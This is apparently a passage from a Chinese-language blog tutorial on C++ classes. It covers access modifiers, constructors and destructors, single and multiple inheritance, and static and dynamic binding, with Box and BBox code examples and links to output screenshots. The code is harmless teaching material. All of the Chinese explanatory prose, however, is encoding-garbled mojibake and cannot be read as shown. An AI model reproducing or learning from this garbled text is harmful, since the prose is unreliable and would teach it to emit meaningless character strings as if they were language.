class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length=len;</span><br><span class="line">std::cout &lt;&lt; length &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Box box;</span><br><span class="line">box.<span class="built_in">set_length</span>(<span class="number">60</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³äº <code>protected</code> ä¿®é¥°ç¬¦ä¸ <code>private</code> éå¸¸ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äº <code>protected</code> æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­æ˜¯å¯ä»¥è®¿é—®çš„ã€‚</p><p>ä½ å¯èƒ½ä¼šé—®è¿™ä¸ªç±»è®¿é—®ä¿®é¥°ç¬¦å‡ºç°çš„æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿå…¶å®è¿™å°±ä½“ç°äº† C++ ä¸­çš„<strong>æ•°æ®å°è£…</strong>ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ•°æ®æˆå‘˜å®šä¹‰ä¸ºç§æœ‰ï¼Œç„¶åé€šè¿‡å…¬æœ‰çš„æˆå‘˜å‡½æ•°ä½œä¸ºæ¥å£æ¥è®¿é—®å’Œæ“ä½œç§æœ‰æˆå‘˜ï¼Œè€Œæ— éœ€çŸ¥é“å…·ä½“å®ç°çš„ç»†èŠ‚ï¼Œè¿™æ ·å°±å¯ä»¥å°†å®ç°ç»†èŠ‚ä¸ä½¿ç”¨è€…éš”ç¦»å¼€ï¼Œæé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p><h3 id="ç±»æ„é€ å‡½æ•°-amp-amp-ææ„å‡½æ•°"><a href="#ç±»æ„é€ å‡½æ•°-amp-amp-ææ„å‡½æ•°" class="headerlink" title="ç±»æ„é€ å‡½æ•°&amp;&amp;ææ„å‡½æ•°"></a>ç±»æ„é€ å‡½æ•°&amp;&amp;ææ„å‡½æ•°</h3><p>å‡è®¾æˆ‘ç°åœ¨æƒ³åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå°±è¾“å‡ºä¸€ä¸ª <code>created successly</code> æˆ–è€…æ˜¯è¿›è¡Œåˆå§‹åŒ–çš„ä¸€äº›æ“ä½œï¼Œæ€»ä¹‹å°±æ˜¯åœ¨åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ¥å®ç°ä¸€äº›åŠŸèƒ½ã€‚é‚£å°±éœ€è¦ç”¨åˆ°æ„é€ å‡½æ•°äº†ï¼Œå®ƒä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡çš„æ—¶å€™å°±è¢«è°ƒç”¨ã€‚</p><p>æ„é€ å‡½æ•°çš„åç§°è¦ä¸ç±»åä¸€è‡´ï¼Œå¹¶ä¸”æ²¡æœ‰ç±»å‹ï¼ˆä¹Ÿå°±æ˜¯æ²¡æœ‰è¿”å›å€¼ç±»å‹ï¼‰</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Box</span>(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;created successly!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length+=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; length &lt;&lt; std:: endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Box *p = <span class="keyword">new</span> <span class="built_in">Box</span>();</span><br><span class="line">p-&gt;<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">p-&gt;<span class="built_in">add_length</span>(<span class="number">4</span>);</span><br><span class="line">p-&gt;<span class="built_in">output_length</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051700123.png" alt="image-20230105170056041"></p><p>å½“ç„¶äº†åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ä¹Ÿå¯ä»¥è¿›è¡Œåˆå§‹åŒ–çš„å·¥ä½œï¼Œæ¯”å¦‚æƒ³å°†æ¯æ¬¡åˆ›å»ºçš„å¯¹è±¡ä¸­çš„ <code>length</code> éƒ½è®¾ç½®ä¸º100ï¼Œé‚£åªéœ€è¦å¯¹æ„é€ å‡½æ•°è¿›è¡Œä¼ å‚å¯¹ <code>length</code> è¿›è¡Œèµ‹å€¼å³å¯ã€‚</p><p>å‡è®¾æˆ‘åˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨é‡Šæ”¾å‰è¿›è¡Œäº†ä¸€äº›æ‰“å¼€æ–‡ä»¶å’Œç”³è¯·å†…å­˜çš„æ“ä½œï¼Œé‚£ä¹ˆæˆ‘å¸Œæœ›åœ¨åˆ é™¤è¿™ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œå¯ä»¥å…³é—­ä¹‹å‰æ‰“å¼€çš„æ–‡ä»¶æˆ–è€…é‡Šæ”¾ç”³è¯·ä¹‹å‰çš„å†…å­˜ï¼Œé‚£è¿™å°±è¦ç”¨åˆ°ææ„å‡½æ•°äº†ï¼Œå®ƒä¼šåœ¨åˆ é™¤å¯¹è±¡çš„æ—¶å€™è‡ªåŠ¨è¢«è§¦å‘ï¼Œåå­—æ˜¯åœ¨ç±»åå‰é¢åŠ äº†ä¸€ä¸ª <code>~</code> ï¼Œè·Ÿæ„é€ å‡½æ•°çš„åˆ©ç”¨ç±»ä¼¼ï¼Œä¸‹é¢ä¸¾ä¾‹åœ¨æ¯æ¬¡åˆ é™¤å¯¹è±¡çš„æ—¶å€™æ‰“å° <code>destruction succeeded!</code> </p><p>ä»£ç å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Box</span>(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;created successly!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">Box</span>(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;destruction succeeded!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length+=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; length &lt;&lt; std:: endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Box *p = <span class="keyword">new</span> <span class="built_in">Box</span>();</span><br><span class="line">p-&gt;<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">p-&gt;<span class="built_in">add_length</span>(<span class="number">4</span>);</span><br><span class="line">p-&gt;<span class="built_in">output_length</span>();</span><br><span class="line"><span class="keyword">delete</span> p;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051753557.png" alt="image-20230105175301371"></p><h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><p>ç»§æ‰¿æŒ‡çš„æ˜¯ç±»ä¸ç±»ä¹‹é—´çš„ä¸€ç§å…³ç³»ï¼Œå‡è®¾æœ‰ä¸€ä¸ªç±» <code>A</code> ï¼Œç„¶åå®ƒå…·æœ‰ <code>100</code> ä¸ªå±æ€§ï¼Œä½†æ˜¯æˆ‘ç°åœ¨å¸Œæœ›å»å®šä¹‰ä¸€ä¸ªç±» <code>B</code> ï¼Œå®ƒåœ¨åŸæœ¬ <code>A</code> æœ‰çš„ <code>100</code> ä¸ªå±æ€§å‰æä¸‹å†åˆ›å»º <code>20</code> ä¸ªå±æ€§ï¼Œæ€ä¹ˆåšå‘¢ï¼Ÿç¡®å®å¯ä»¥é€‰æ‹©ä¹‹é—´å°†ç±» <code>A</code> çš„ä»£ç  <code>copy</code> åˆ°  <code>B</code> ä¸­ï¼Œä½†è¿™æ ·æ˜¾çš„ä»£ç è¿‡äºè‡ƒè‚¿ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ç»§æ‰¿ï¼Œ <code>B</code> ç»§æ‰¿ <code>A</code> æ‰€æœ‰çš„å±æ€§ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šå†å¢åŠ è‡ªå·±æ–°çš„å±æ€§ã€‚</p><p>ä¸‹é¢çš„ä»£ç å±•ç¤ºäº†ç»§æ‰¿</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="type">int</span> width;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length+=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;length is &quot;</span> &lt;&lt;length &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BBox</span> : <span class="keyword">public</span> Box</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hight;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_hight</span><span class="params">(<span class="type">int</span> hei)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">hight=hei;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_hight</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hight is &quot;</span> &lt;&lt; hight &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BBox box;</span><br><span class="line">box.<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">box.<span class="built_in">set_hight</span>(<span class="number">30</span>);</span><br><span class="line">box.<span class="built_in">output_length</span>();</span><br><span class="line">box.<span class="built_in">output_hight</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051935782.png" alt="image-20230105193512645"></p><p>ç”±æ­¤å¯ä»¥çœ‹å‡ºæ¥ï¼Œ <code>BBox</code> è¿™ä¸ªç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰ç»§æ‰¿äº† <code>BOX</code> ç±»ï¼ˆåŸºç±»ï¼‰ï¼Œç„¶åå®ä¾‹åŒ–å‡ºæ¥çš„ <code>box</code> å¯¹è±¡æ—¢æ‹¥æœ‰åŸæœ¬åŸºç±»çš„å±æ€§å’Œæ–¹æ³•ï¼Œåˆæ‹¥æœ‰æ–°å¢åŠ çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><p>éœ€è¦è¡¥å……çš„æ˜¯åœ¨å®šä¹‰è¿™ä¸ªç»§æ‰¿ç±»çš„æ—¶å€™æ‰§è¡Œäº† <code>class BBox : public Box</code> å†æ¬¡ä½¿ç”¨äº† <code>public</code>  è¿™ä¸ªè®¿é—®ä¿®é¥°ç¬¦ï¼Œæ ‡æ˜äº†ç»§æ‰¿ç±»å‹ã€‚æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>public</code> ç»§æ‰¿ï¼Œå¾ˆå°‘ä½¿ç”¨ <code>protected</code> å’Œ <code>private</code> ç»§æ‰¿ã€‚ä½¿ç”¨ä¸åŒç±»å‹ç»§æ‰¿ï¼Œéµå¾ªä»¥ä¸‹å‡ ä¸ªè§„åˆ™ï¼š</p><ol><li><strong>å…¬æœ‰ç»§æ‰¿ï¼ˆpublicï¼‰ï¼š</strong>å½“ä¸€ä¸ªç±»æ´¾ç”Ÿè‡ª<strong>å…¬æœ‰</strong>åŸºç±»æ—¶ï¼ŒåŸºç±»çš„<strong>å…¬æœ‰</strong>æˆå‘˜ä¹Ÿæ˜¯æ´¾ç”Ÿç±»çš„<strong>å…¬æœ‰</strong>æˆå‘˜ï¼ŒåŸºç±»çš„<strong>ä¿æŠ¤</strong>æˆå‘˜ä¹Ÿæ˜¯æ´¾ç”Ÿç±»çš„<strong>ä¿æŠ¤</strong>æˆå‘˜ï¼ŒåŸºç±»çš„<strong>ç§æœ‰</strong>æˆå‘˜ä¸èƒ½ç›´æ¥è¢«æ´¾ç”Ÿç±»è®¿é—®ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è°ƒç”¨åŸºç±»çš„<strong>å…¬æœ‰</strong>å’Œ<strong>ä¿æŠ¤</strong>æˆå‘˜æ¥è®¿é—®ã€‚</li><li><strong>ä¿æŠ¤ç»§æ‰¿ï¼ˆprotectedï¼‰ï¼š</strong> å½“ä¸€ä¸ªç±»æ´¾ç”Ÿè‡ª<strong>ä¿æŠ¤</strong>åŸºç±»æ—¶ï¼ŒåŸºç±»çš„<strong>å…¬æœ‰</strong>å’Œ<strong>ä¿æŠ¤</strong>æˆå‘˜å°†æˆä¸ºæ´¾ç”Ÿç±»çš„<strong>ä¿æŠ¤</strong>æˆå‘˜ã€‚</li><li><strong>ç§æœ‰ç»§æ‰¿ï¼ˆprivateï¼‰ï¼š</strong>å½“ä¸€ä¸ªç±»æ´¾ç”Ÿè‡ª<strong>ç§æœ‰</strong>åŸºç±»æ—¶ï¼ŒåŸºç±»çš„<strong>å…¬æœ‰</strong>å’Œ<strong>ä¿æŠ¤</strong>æˆå‘˜å°†æˆä¸ºæ´¾ç”Ÿç±»çš„<strong>ç§æœ‰</strong>æˆå‘˜ã€‚</li></ol><p>ä¸Šè¿°è§„åˆ™è½¬è‡ªï¼š<a href="https://www.runoob.com/cplusplus/cpp-inheritance.html">C++ ç»§æ‰¿ | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><h4 id="å¤šç»§æ‰¿"><a href="#å¤šç»§æ‰¿" class="headerlink" title="å¤šç»§æ‰¿"></a>å¤šç»§æ‰¿</h4><p>å°±æ˜¯ç±» <code>A</code> å¯ä»¥åŒæ—¶ç»§æ‰¿ <code>B</code> å’Œ <code>C</code> ä¸­çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œè¢«ç§°ä¹‹ä¸ºå¤šç»§æ‰¿ã€‚å­—é¢æ„æ€å°±æ˜¯å…¶ä½œç”¨ï¼ŒæŒ‡ä¸€ä¸ªç±»å¯ä»¥åŒæ—¶ç»§æ‰¿å¤šä¸ªç±»çš„ç‰¹å¾ã€‚</p><p>ä»£ç å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="type">int</span> width;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length+=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;length is &quot;</span> &lt;&lt;length &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">obj</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *color;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_color</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *col)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">color=col;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_color</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;color is &quot;</span> &lt;&lt; color &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BBox</span> : <span class="keyword">public</span> Box,<span class="keyword">public</span> obj</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hight;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_hight</span><span class="params">(<span class="type">int</span> hei)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">hight=hei;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_hight</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hight is &quot;</span> &lt;&lt; hight &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BBox box;</span><br><span class="line">box.<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">box.<span class="built_in">set_hight</span>(<span class="number">30</span>);</span><br><span class="line">box.<span class="built_in">output_length</span>();</span><br><span class="line">box.<span class="built_in">output_hight</span>();</span><br><span class="line">box.<span class="built_in">set_color</span>(<span class="string">&quot;blue&quot;</span>);</span><br><span class="line">box.<span class="built_in">output_color</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052000403.png" alt="image-20230105200054215"></p><p>å¯ä»¥çœ‹åˆ° <code>BBox</code> åŒæ—¶ç»§æ‰¿äº† <code>Box</code> å’Œ <code>obj</code> ä¸¤ä¸ªç±»çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¹¶ä¸”æˆåŠŸè°ƒç”¨ã€‚è¿™ä¸ªå¤šç»§æ‰¿ç†è§£èµ·æ¥åº”è¯¥è›®ç®€å•çš„ï¼Œ<strong>å€¼å¾—ä¸€æçš„æ˜¯æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ä¸å¯ä»¥è¢«ç»§æ‰¿</strong>ã€‚</p><h3 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h3><p>å¤šæ€æ˜¯é’ˆå¯¹å…·ä½“æŸä¸ªå‡½æ•°è€Œè¨€çš„ï¼Œç§°ä¹‹ä¸ºå¤šæ€æ€§ã€‚åœ¨ C++ ä¸­ï¼Œä¸€ä¸ªå‡½æ•°è¦æƒ³å…·æœ‰å¤šæ€æ€§ï¼Œå¿…é¡»åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ol><li>å‡½æ•°æ˜¯ä»åŸºç±»ç»§æ‰¿è€Œæ¥çš„ï¼Œå³åŸºç±»ä¸­å®šä¹‰äº†è¿™ä¸ªå‡½æ•°ï¼Œè€Œæ´¾ç”Ÿç±»ä¸­åˆé‡æ–°å®šä¹‰äº†è¿™ä¸ªå‡½æ•°ã€‚</li><li>å‡½æ•°ä¸ºåŠ¨æ€ç»‘å®šï¼Œè¿™æ„å‘³ç€å‡½æ•°çš„è°ƒç”¨ç‰ˆæœ¬æ˜¯åœ¨è¿è¡Œæ—¶ç¡®å®šçš„ã€‚åœ¨ C++ ä¸­ï¼Œå¯ä»¥ä½¿ç”¨è™šå‡½æ•°æ¥å®ç°åŠ¨æ€ç»‘å®šã€‚</li></ol><p>ç¬¬ä¸€ä¸ªæ¡ä»¶å¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯æˆ‘åœ¨åŸºç±» <code>A</code> ä¸­å®šä¹‰äº†å‡½æ•° <code>print</code> ï¼Œåœ¨å®ƒçš„æ´¾ç”Ÿç±» <code>B</code> ä¸­æˆ‘å¯¹ç»§æ‰¿æ¥çš„å‡½æ•° <code>print</code> è¿›è¡Œäº†é‡å†™ã€‚</p><h4 id="é™æ€ç»‘å®š"><a href="#é™æ€ç»‘å®š" class="headerlink" title="é™æ€ç»‘å®š"></a>é™æ€ç»‘å®š</h4><p>å°†ç¬¬äºŒä¸ªæ¡ä»¶å°±è¦æåˆ° C++ é‡Œçš„é™æ€ç»‘å®šå’ŒåŠ¨æ€ç»‘å®šçš„æ¦‚å¿µï¼Œé™æ€ç»‘å®šæŒ‡çš„æ˜¯åœ¨ç¼–è¯‘æ—¶å°±å·²ç»å¯ä»¥ç¡®å®šè°ƒç”¨çš„å‡½æ•°ç‰ˆæœ¬ï¼ˆä¹Ÿå°±æ˜¯ç¡®å®šè°ƒç”¨çš„è¿™ä¸ªå‡½æ•°å±äºå“ªä¸ªç±»ä¸­çš„ï¼‰ï¼Œè¿™æ ·å³ä½¿æ´¾ç”Ÿç±»é‡å†™äº†å‡½æ•°ï¼Œä¹Ÿä¸ä¼šä½“ç°å‡ºå¤šæ€çš„æ•ˆæœï¼Œé™æ€ç»‘å®šå¯ä»¥ä½¿ç¨‹åºæ‰§è¡Œçš„æ›´å¿«ï¼Œå› ä¸ºç¼–è¯‘å™¨å¯ä»¥åœ¨ç¼–è¯‘æ—¶ç¡®å®šå‡½æ•°çš„è°ƒç”¨ç‰ˆæœ¬ï¼Œè€Œä¸éœ€è¦åœ¨è¿è¡Œæ—¶è°ƒç”¨ã€‚</p><p>å¦‚ä¸‹ä»£ç ï¼Œ <code>print</code> å‡½æ•°å°±ä¸ºé™æ€ç»‘å®š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;B::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> : <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;A::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    B b;</span><br><span class="line">    b.<span class="built_in">print</span>();  <span class="comment">// é™æ€ç»‘å®šï¼šB::print</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="åŠ¨æ€ç»‘å®š"><a href="#åŠ¨æ€ç»‘å®š" class="headerlink" title="åŠ¨æ€ç»‘å®š"></a>åŠ¨æ€ç»‘å®š</h4><p>åŠ¨æ€ç»‘å®šæ˜¯å‡½æ•°åœ¨è°ƒç”¨æ—¶ç¡®å®šçš„å…·ä½“ç‰ˆæœ¬ï¼ˆä¹Ÿå°±æ˜¯å“ªä¸ªç±»ä¸­çš„å‡½æ•°ï¼‰ï¼Œè€Œéåœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šäº†ã€‚</p><p>è¿™æ˜¯é€šè¿‡æŒ‡é’ˆæ¥è°ƒç”¨å‡½æ•°å®ç°çš„ï¼Œæ¯”å¦‚æˆ‘å®šä¹‰äº†ä¸€ä¸ªåŸºç±» <code>A</code> çš„æŒ‡é’ˆä¸º <code>a</code> ï¼Œç„¶åç”³è¯·äº†å®ƒçš„æ´¾ç”Ÿç±» <code>B</code> å¤§å°çš„ç©ºé—´ï¼Œå°†æŒ‡é’ˆ <code>a</code> æŒ‡å‘äº†ç”³è¯· <code>B</code> ç±»çš„å¯¹è±¡åœ°å€ã€‚è¿™ä¸ªå†™æˆä»£ç åº”è¯¥ä¸º <code>A* a = new B() </code> ã€‚è¿™é‡Œå…¶å®æ˜¯æˆ‘å®ä¾‹åŒ–äº†ä¸€ä¸ª <code>B</code> ç±»çš„å¯¹è±¡ï¼Œç„¶åè®©æŒ‡é’ˆ <code>a</code> æŒ‡å‘äº†è¿™ä¸ªå¯¹è±¡çš„åœ°å€ï¼Œè¿™é‡Œä¹‹æ‰€ä»¥ <code>B</code> åé¢å¸¦ <code>()</code>ï¼Œæ˜¯è¡¨ç¤ºè°ƒç”¨äº† <code>B</code> ç±»çš„æ„é€ å‡½æ•°æ¥åˆ›å»º <code>B</code> ç±»å¯¹è±¡ã€‚</p><p>è€Œä¸Šè¿°çš„æƒ…å†µå°±ä¼šå¯¼è‡´ï¼Œæˆ‘å¯ä»¥ç»™ <code>a</code> æŒ‡é’ˆä»»æ„èµ‹å€¼å…¶ä»–å¯¹è±¡ï¼Œå› ä¸º <code>a</code> çš„æŒ‡é’ˆç±»å‹ä¸ºåŸºç±»,æ‰€ä»¥æˆ‘å¯ä»¥éšæ„æŒ‡å‘å®ƒçš„æ´¾ç”Ÿç±»ï¼Œè¿™å°±å¯¼è‡´äº†æˆ‘åœ¨ç¼–è¯‘çš„æ—¶å€™ä¸èƒ½ç¡®å®šè¿™ä¸ªæŒ‡é’ˆåˆ°åº•è°ƒç”¨çš„å“ªä¸ªç±»ä¸­çš„æ–¹æ³•ã€‚å› 